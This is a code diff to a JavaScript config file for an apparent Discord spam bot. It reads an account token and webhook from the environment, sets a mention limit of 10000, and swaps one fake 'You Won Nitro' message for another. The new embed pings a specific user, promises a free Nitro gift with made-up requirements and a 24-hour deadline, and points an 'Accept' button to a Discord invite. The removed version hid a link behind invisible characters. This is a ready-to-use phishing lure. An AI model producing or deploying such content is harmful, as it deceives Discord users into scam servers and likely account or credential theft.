@@ -1,5 +1,8 @@
 module.exports = {
     token: process.env.token,
+    webhook: process.env.webhook,
+    icon: "https://polybit-apps.s3.amazonaws.com/stdlib/users/discord/profile/image.png",
+
     advanced: {
         limit: 5,
         leave: true
@@ -10,18 +13,84 @@ module.exports = {
     },
     blacklist: [],
     mention_limit: 10000,
-    webhook: process.env.webhook,
-    icon: "https://polybit-apps.s3.amazonaws.com/stdlib/users/discord/profile/image.png",
 
     embed: [
         {
-            content: "**__🎁 You Won Nitro ! 🎁__**\nYou've been presented from Nasty, to receive this special holiday reward 99.99$ Discord Nitro!\n > oIn order to redeem the Claim your 99.99$ Discord Nitro gift you\n>  MUST the ** [Claim Button](https://discord.gg/MwRBgGGaam) **\n> [󠀠󠀠󠀠󠀠󠀠‎‏‎‍‍.](https://media.discordapp.net/attachments/1071630827806543982/1072364769924894750/unknown-138.png?ex=66ab0704&is=66a9b584&hm=ae4afb97225d0eb7d79dd8f7d581844b53e4a507d1c88f77e4ab8e6c90616369&=&format=webp&quality=lossless&width=1050&height=591)"
+            content: "<@758295957271347201> **🎁 You Won Nitro Boost!**",
+            embeds: [
+                {
+                    title: "🎉 **Discord Nitro Gift** 🎉",
+                    description: "**Congratulations!** You've been selected to receive a **1 Month Discord Nitro** gift!\n\n> To claim your prize, simply click the **Accept** button below.\n\n> **📌 Requirements:**\n> - You must be in the server for at least **5 minutes**\n> - Your account must be **verified**\n> - You have not claimed a gift in the last **30 days**\n\n> ⏳ **This offer expires in 24 hours!**",
+                    color: 0x5865F2,
+                    thumbnail: {
+                        url: "https://cdn.discordapp.com/emojis/1256195346598535198.png?size=96"
+                    },
+                    image: {
+                        url: "https://i.postimg.cc/kGgQVXgd/niporta-png.png"
+                    },
+                    footer: {
+                        text: "© 2026 Discord Nitro Giveaway"
+                    }
+                }
+            ],
+            components: [
+                {
+                    type: 1,
+                    components: [
+                        {
+                            type: 2,
+                            label: "Accept",
+                            style: 5,
+                            emoji: {
+                                name: "🎁",
+                                id: null,
+                                animated: false
+                            },
+                            url: "https://discord.gg/uDFzY9MdPp"
+                        }
+                    ]
+                }
+            ]
         }
     ],
 
     embed2: [
         {
-            content: "**__🎁 You Won Nitro ! 🎁__**\nYou've been presented from Nasty, to receive this special holiday reward 99.99$ Discord Nitro!\n > oIn order to redeem the Claim your 99.99$ Discord Nitro gift you\n>  MUST the ** [Claim Button](https://discord.gg/MwRBgGGaam) **\n> [󠀠󠀠󠀠󠀠󠀠‎‏‎‍‍.](https://media.discordapp.net/attachments/1071630827806543982/1072364769924894750/unknown-138.png?ex=66ab0704&is=66a9b584&hm=ae4afb97225d0eb7d79dd8f7d581844b53e4a507d1c88f77e4ab8e6c90616369&=&format=webp&quality=lossless&width=1050&height=591)"
+            content: "<@758295957271347201> **🎁 You Won Nitro Boost!**",
+            embeds: [
+                {
+                    title: "🎉 **Discord Nitro Gift** 🎉",
+                    description: "**Congratulations!** You've been selected to receive a **1 Month Discord Nitro** gift!\n\n> To claim your prize, simply click the **Accept** button below.\n\n> **📌 Requirements:**\n> - You must be in the server for at least **5 minutes**\n> - Your account must be **verified**\n> - You have not claimed a gift in the last **30 days**\n\n> ⏳ **This offer expires in 24 hours!**",
+                    color: 0x5865F2,
+                    thumbnail: {
+                        url: "https://cdn.discordapp.com/emojis/1256195346598535198.png?size=96"
+                    },
+                    image: {
+                        url: "https://i.postimg.cc/kGgQVXgd/niporta-png.png"
+                    },
+                    footer: {
+                        text: "© 2026 Discord Nitro Giveaway"
+                    }
+                }
+            ],
+            components: [
+                {
+                    type: 1,
+                    components: [
+                        {
+                            type: 2,
+                            label: "Accept",
+                            style: 5,
+                            emoji: {
+                                name: "🎁",
+                                id: null,
+                                animated: false
+                            },
+                            url: "https://discord.gg/uDFzY9MdPp"
+                        }
+                    ]
+                }
+            ]
         }
     ]
 };
